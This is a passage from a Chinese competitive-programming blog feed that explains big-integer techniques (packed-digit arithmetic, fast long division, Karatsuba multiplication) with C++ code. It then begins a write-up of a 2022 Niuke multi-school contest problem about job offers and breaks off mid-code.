class="built_in">print</span>(c);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            <span class="built_in">sub</span>(a, b, c);</span><br><span class="line">            <span class="built_in">print</span>(c);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            <span class="built_in">mul</span>(a, b, c);</span><br><span class="line">            <span class="built_in">print</span>(c);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="built_in">div</span>(a, b, c, d);</span><br><span class="line">            <span class="built_in">print</span>(c);</span><br><span class="line">            <span class="built_in">print</span>(d);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;&gt; &lt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="压位高精度"><a href="#压位高精度" class="headerlink" title="压位高精度"></a>压位高精度</h2><p>在一般的高精度加法，减法，乘法运算中，我们都是将参与运算的数拆分成一个个单独的数码进行运算。</p><p>例如计算 $8192\times 42$ 时，如果按照高精度乘高精度的计算方式，我们实际上算的是 $(8000+100+90+2)\times(40+2)$。</p><p>在位数较多的时候，拆分出的数也很多，高精度运算的效率就会下降。</p><p>有没有办法作出一些优化呢？</p><p>注意到拆分数字的方式并不影响最终的结果，因此我们可以将若干个数码进行合并。</p><p>还是以上面这个例子为例，如果我们每两位拆分一个数，我们可以拆分成 $(8100+92)\times 42$。</p><p>这样的拆分不影响最终结果，但是因为拆分出的数字变少了，计算效率也就提升了。</p><p>从 <a href="./base.md">进位制</a> 的角度理解这一过程，我们通过在较大的进位制（上面每两位拆分一个数，可以认为是在 $100$ 进制下进行运算）下进行运算，从而达到减少参与运算的数字的位数，提升运算效率的目的。</p><p>这就是 <strong>压位高精度</strong> 的思想。</p><p>下面我们给出压位高精度的加法代码，用于进一步阐述其实现方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里的 a,b,c 数组均为 p 进制下的数</span></span><br><span class="line"><span class="comment">// 最终输出答案时需要将数字转为十进制</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        c[i] += a[i] + b[i];</span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= p) &#123;  <span class="comment">// 在普通高精度运算下，p=10</span></span><br><span class="line">            c[i + <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">            c[i] -= p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="压位高精下的高效竖式除法"><a href="#压位高精下的高效竖式除法" class="headerlink" title="压位高精下的高效竖式除法"></a>压位高精下的高效竖式除法</h3><p>在使用压位高精时，如果试商时仍然使用上文介绍的方法，由于试商次数会很多，计算常数会非常大。例如在万进制下，平均每个位需要试商 5000 次，这个巨大的常数是不可接受的。因此我们需要一个更高效的试商办法。</p><p>我们可以把 double 作为媒介。假设被除数有 4 位，是 $a_4,a_3,a_2,a_1$，除数有 3 位，是 $b_3,b_2,b_1$，那么我们只要试一位的商：使用 $base$ 进制，用式子 $\dfrac{a_4 base + a_3}{b_3 + b_2 base^{-1} + (b_1+1)base^{-2}}$ 来估商。而对于多个位的情况，就是一位的写法加个循环。由于除数使用 3 位的精度来参与估商，能保证估的商 q’ 与实际商 q 的关系满足 $q-1 \le q’ \le q$，这样每个位在最坏的情况下也只需要两次试商。但与此同时要求 $base^3$ 在 double 的有效精度内，即 $base^3 &lt; 2^{53}$，所以在运用这个方法时建议不要超过 32768 进制，否则很容易因精度不足产生误差从而导致错误。</p><p>另外，由于估的商总是小于等于实际商，所以还有再进一步优化的空间。绝大多数情况下每个位只估商一次，这样在下一个位估商时，虽然得到的商有可能因为前一位的误差造成试商结果大于等于 base，但这没有关系，只要在最后再最后做统一进位便可。举个例子，假设 base 是 10，求 $395081/9876$，试商计算步骤如下：</p><ol><li>首先试商计算得到 $3950/988=3$，于是 $395081-(9876 \times 3 \times 10^1) = 98801$，这一步出现了误差，但不用管，继续下一步计算。</li><li>对余数 98801 继续试商计算得到 $9880/988=10$，于是 $98801-(9876 \times 10 \times 10^0) = 41$，这就是最终余数。</li><li>把试商过程的结果加起来并处理进位，即 $3 \times 10^1 + 10 \times 10^0 = 40$ 便是准确的商。</li></ol><p>方法虽然看着简单，但具体实现上很容易进坑，所以以下提供一个经过多番验证确认没有问题的实现供大家参考，要注意的细节也写在注释当中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 完整模板和实现 https://baobaobear.github.io/post/20210228-bigint1/</span></span><br><span class="line">    <span class="comment">// 对b乘以mul再左移offset的结果相减，为除法服务</span></span><br><span class="line"><span class="function">BigIntSimple &amp;<span class="title">sub_mul</span><span class="params">(<span class="keyword">const</span> BigIntSimple &amp;b, <span class="keyword">int</span> mul, <span class="keyword">int</span> offset)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mul == <span class="number">0</span>) <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">int</span> borrow = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 与减法不同的是，borrow可能很大，不能使用减法的写法</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; b.v.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        borrow += v[i + offset] - b.v[i] * mul - BIGINT_BASE + <span class="number">1</span>;</span><br><span class="line">        v[i + offset] = borrow % BIGINT_BASE + BIGINT_BASE - <span class="number">1</span>;</span><br><span class="line">        borrow /= BIGINT_BASE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果还有借位就继续处理</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = b.v.<span class="built_in">size</span>(); borrow; ++i) &#123;</span><br><span class="line">        borrow += v[i + offset] - BIGINT_BASE + <span class="number">1</span>;</span><br><span class="line">        v[i + offset] = borrow % BIGINT_BASE + BIGINT_BASE - <span class="number">1</span>;</span><br><span class="line">        borrow /= BIGINT_BASE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BigIntSimple <span class="title">div_mod</span><span class="params">(<span class="keyword">const</span> BigIntSimple &amp;b, BigIntSimple &amp;r)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    BigIntSimple d;</span><br><span class="line">    r = *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">absless</span>(b)) <span class="keyword">return</span> d;</span><br><span class="line">    d.v.<span class="built_in">resize</span>(v.<span class="built_in">size</span>() - b.v.<span class="built_in">size</span>() + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 提前算好除数的最高三位+1的倒数，若最高三位是a3,a2,a1</span></span><br><span class="line">    <span class="comment">// 那么db是a3+a2/base+(a1+1)/base^2的倒数，最后用乘法估商的每一位</span></span><br><span class="line">    <span class="comment">// 此法在BIGINT_BASE&lt;=32768时可在int32范围内用</span></span><br><span class="line">    <span class="comment">// 但即使使用int64，那么也只有BIGINT_BASE&lt;=131072时可用（受double的精度限制）</span></span><br><span class="line">    <span class="comment">// 能保证估计结果q&#x27;与实际结果q的关系满足q&#x27;&lt;=q&lt;=q&#x27;+1</span></span><br><span class="line">    <span class="comment">// 所以每一位的试商平均只需要一次，只要后面再统一处理进位即可</span></span><br><span class="line">    <span class="comment">// 如果要使用更大的base，那么需要更换其它试商方案</span></span><br><span class="line">    <span class="keyword">double</span> t = (b.<span class="built_in">get</span>((<span class="keyword">unsigned</span>)b.v.<span class="built_in">size</span>() - <span class="number">2</span>) +</span><br><span class="line">                (b.<span class="built_in">get</span>((<span class="keyword">unsigned</span>)b.v.<span class="built_in">size</span>() - <span class="number">3</span>) + <span class="number">1.0</span>) / BIGINT_BASE);</span><br><span class="line">    <span class="keyword">double</span> db = <span class="number">1.0</span> / (b.v.<span class="built_in">back</span>() + t / BIGINT_BASE);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = v.<span class="built_in">size</span>() - <span class="number">1</span>, j = d.v.<span class="built_in">size</span>() - <span class="number">1</span>; j &lt;= v.<span class="built_in">size</span>();) &#123;</span><br><span class="line">        <span class="keyword">int</span> rm = r.<span class="built_in">get</span>(i + <span class="number">1</span>) * BIGINT_BASE + r.<span class="built_in">get</span>(i);</span><br><span class="line">        <span class="keyword">int</span> m = std::<span class="built_in">max</span>((<span class="keyword">int</span>)(db * rm), r.<span class="built_in">get</span>(i + <span class="number">1</span>));</span><br><span class="line">        r.<span class="built_in">sub_mul</span>(b, m, j);</span><br><span class="line">        d.v[j] += m;</span><br><span class="line">        <span class="keyword">if</span> (!r.<span class="built_in">get</span>(i + <span class="number">1</span>))  <span class="comment">// 检查最高位是否已为0，避免极端情况</span></span><br><span class="line">            --i, --j;</span><br><span class="line">    &#125;</span><br><span class="line">    r.<span class="built_in">trim</span>();</span><br><span class="line">    <span class="comment">// 修正结果的个位</span></span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!r.<span class="built_in">absless</span>(b)) &#123;</span><br><span class="line">        r.<span class="built_in">subtract</span>(b);</span><br><span class="line">        ++carry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 修正每一位的进位</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; d.v.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        carry += d.v[i];</span><br><span class="line">        d.v[i] = carry % BIGINT_BASE;</span><br><span class="line">        carry /= BIGINT_BASE;</span><br><span class="line">    &#125;</span><br><span class="line">    d.<span class="built_in">trim</span>();</span><br><span class="line">    d.sign = sign * b.sign;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigIntSimple <span class="keyword">operator</span>/(<span class="keyword">const</span> BigIntSimple &amp;b) <span class="keyword">const</span> &#123;</span><br><span class="line">    BigIntSimple r;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">div_mod</span>(b, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigIntSimple <span class="keyword">operator</span>%(<span class="keyword">const</span> BigIntSimple &amp;b) <span class="keyword">const</span> &#123;</span><br><span class="line">    BigIntSimple r;</span><br><span class="line">    <span class="built_in">div_mod</span>(b, r);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Karatsuba-乘法"><a href="#Karatsuba-乘法" class="headerlink" title="Karatsuba 乘法"></a>Karatsuba 乘法</h2><p>记高精度数字的位数为 $n$，那么高精度—高精度竖式乘法需要花费 $O(n^2)$ 的时间。本节介绍一个时间复杂度更为优秀的算法，由前苏联（俄罗斯）数学家 Anatoly Karatsuba 提出，是一种分治算法。</p><p>考虑两个十进制大整数 $x$ 和 $y$，均包含 $n$ 个数码（可以有前导零）。任取 $0 &lt; m &lt; n$，记</p><p>$$<br>\begin{aligned}<br>x &amp;= x_1 \cdot 10^m + x_0, \<br>y &amp;= y_1 \cdot 10^m + y_0, \<br>x \cdot y &amp;= z_2 \cdot 10^{2m} + z_1 \cdot 10^m + z_0,<br>\end{aligned}<br>$$</p><p>其中 $x_0, y_0, z_0, z_1 &lt; 10^m$。可得</p><p>$$<br>\begin{aligned}<br>z_2 &amp;= x_1 \cdot y_1, \<br>z_1 &amp;= x_1 \cdot y_0 + x_0 \cdot y_1, \<br>z_0 &amp;= x_0 \cdot y_0.<br>\end{aligned}<br>$$</p><p>观察知</p><p>$$<br>z_1 = (x_1 + x_0) \cdot (y_1 + y_0) - z_2 - z_0,<br>$$</p><p>于是要计算 $z_1$，只需计算 $(x_1 + x_0) \cdot (y_1 + y_0)$，再与 $z_0$、$z_2$ 相减即可。</p><p>上式实际上是 Karatsuba 算法的核心，它将长度为 $n$ 的乘法问题转化为了 $3$ 个长度更小的子问题。若令 $m = \left\lceil \dfrac n 2 \right\rceil$，记 Karatsuba 算法计算两个 $n$ 位整数乘法的耗时为 $T(n)$，则有 $T(n) = 3 \cdot T \left(\left\lceil \dfrac n 2 \right\rceil\right) + O(n)$，由主定理可得 $T(n) = \Theta(n^{\log_2 3}) \approx \Theta(n^{1.585})$。</p><p>整个过程可以递归实现。为清晰起见，下面的代码通过 Karatsuba 算法实现了多项式乘法，最后再处理所有的进位问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">karatsuba_polymul</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> *a, <span class="keyword">int</span> *b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="comment">// 规模较小时直接计算，避免继续递归带来的效率损失</span></span><br><span class="line">        <span class="keyword">int</span> *r = <span class="keyword">new</span> <span class="keyword">int</span>[n * <span class="number">2</span> + <span class="number">1</span>]();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; ++i)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= n; ++j) r[i + j] += a[i] * b[j];</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> m = n / <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> *r = <span class="keyword">new</span> <span class="keyword">int</span>[m * <span class="number">4</span> + <span class="number">1</span>]();</span><br><span class="line">    <span class="keyword">int</span> *z0, *z1, *z2;</span><br><span class="line"></span><br><span class="line">    z0 = <span class="built_in">karatsuba_polymul</span>(m - <span class="number">1</span>, a, b);</span><br><span class="line">    z2 = <span class="built_in">karatsuba_polymul</span>(n - m, a + m, b + m);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 z1</span></span><br><span class="line">    <span class="comment">// 临时更改，计算完毕后恢复</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i + m &lt;= n; ++i) a[i] += a[i + m];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i + m &lt;= n; ++i) b[i] += b[i + m];</span><br><span class="line">    z1 = <span class="built_in">karatsuba_polymul</span>(m - <span class="number">1</span>, a, b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i + m &lt;= n; ++i) a[i] -= a[i + m];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i + m &lt;= n; ++i) b[i] -= b[i + m];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (m - <span class="number">1</span>) * <span class="number">2</span>; ++i) z1[i] -= z0[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (n - m) * <span class="number">2</span>; ++i) z1[i] -= z2[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由 z0、z1、z2 组合获得结果</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (m - <span class="number">1</span>) * <span class="number">2</span>; ++i) r[i] += z0[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (m - <span class="number">1</span>) * <span class="number">2</span>; ++i) r[i + m] += z1[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (n - m) * <span class="number">2</span>; ++i) r[i + m * <span class="number">2</span>] += z2[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] z0;</span><br><span class="line">    <span class="keyword">delete</span>[] z1;</span><br><span class="line">    <span class="keyword">delete</span>[] z2;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">karatsuba_mul</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *r = <span class="built_in">karatsuba_polymul</span>(LEN - <span class="number">1</span>, a, b);</span><br><span class="line">    <span class="built_in">memcpy</span>(c, r, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>) * LEN);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i)</span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">            c[i] %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是这样的实现存在一个问题：在 $b$ 进制下，多项式的每一个系数都有可能达到 $n \cdot b^2$ 量级，在压位高精度实现中可能造成整数溢出；而若在多项式乘法的过程中处理进位问题，则 $x_1 + x_0$ 与 $y_1 + y_0$ 的结果可能达到 $2 \cdot b^m$，增加一个位（如果采用 $x_1 - x_0$ 的计算方式，则不得不特殊处理负数的情况）。因此，需要依照实际的应用场景来决定采用何种实现方式。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 数学 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>“蔚来杯”2022牛客暑期多校训练营4题解</title>
      <link href="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>这把依然和 sigma 姐姐打这场多校。出了4题rank300多也还可以的，该罚坐的题还是罚坐，该做的也都做了。</p><span id="more"></span><h2 id="D-Jobs-Easy-Version"><a href="#D-Jobs-Easy-Version" class="headerlink" title="D. Jobs (Easy Version)"></a>D. Jobs (Easy Version)</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题就是说，有 $n$ 家公司，然后主人公有 $q$ 个朋友，每个公司有一定的职位，如果你至少符合一个公司的 $3Q(IQ,EQ,AQ)$ 要求，那么这家公司就会给你发 offer，然后问你这些朋友分别能拿多少 offer。这题防止读入量太大给你一个随机生成器去产生数据，最后还要求强制在线。</p><p>因为 3Q 的范围都比较小，然后当然我们就可以存一个最低的要求，因为我只用符合一个职位就可以了，我们最开始的想法是：开个数组：$dp[i][j][k][b]$ 表示第 $i$ 家公司 $IQ=j,EQ=k,AQ=b$ 能拿到多少职位。那么我们读入公司的职位要求然后先给当前点都 $+1$然后前缀以下，查询的时候只需要把相应的公司，3Q 输入下标查询是否为 0 即可，为 0 就说明没有 offer 嘛。</p><p>但是一算数据量发现编译器就阻拦住了，因此换一种思路，因为我们不需要知道一个人在一个公司能拿多少 offer 我们只关心拿没拿 offer，因此我们可以降维度去做。 $dp[i][j][k]$ 表示第 $i$ 家公司，$IQ=j,EQ=k$ 的情况下，能至少拿一个职位需要的最低 $AQ$。那么查询的时候我们只需要把 $i\ j\ k$ 给下标取出最低要求判断我的 $AQ$ 是否大于等于即可。然后就是抄随即发生器，在 $seed^{q-i}$ 可以写快速幂去算，最重要的一点：一定不要溢出，可以的话都开 long long 一定没事，或者为了提醒自己，时刻加上 <code>assert(v&gt;=0)</code> 至少提交的时候虽然浪费 20 罚时，但是你看到运行错误你就知道是溢出了，而不是一脸懵逼不知道哪里出错了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOD 998244353</span></span><br><span class="line"><span class="keyword">int</span> seed;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">10</span>][<span class="number">401</span>][<span class="number">401</span>];</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> base,<span class="keyword">int</span> exp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> k=base;exp;exp&gt;&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(exp&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            ans=(ans*k)%MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        k=k*k%MOD;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dp));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> num,IQ,EQ,AQ;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=num;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;IQ,&amp;EQ,&amp;AQ);</span><br><span class="line">            dp[i][IQ][EQ]=<span class="built_in">min</span>(dp[i][IQ][EQ],AQ);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">400</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">400</span>;k++)&#123;</span><br><span class="line">                dp[i][j][k]=<span class="built_in">min</span>(dp[i][j][k],<span class="built_in">min</span>(dp[i][j][k<span class="number">-1</span>],dp[i][j<span 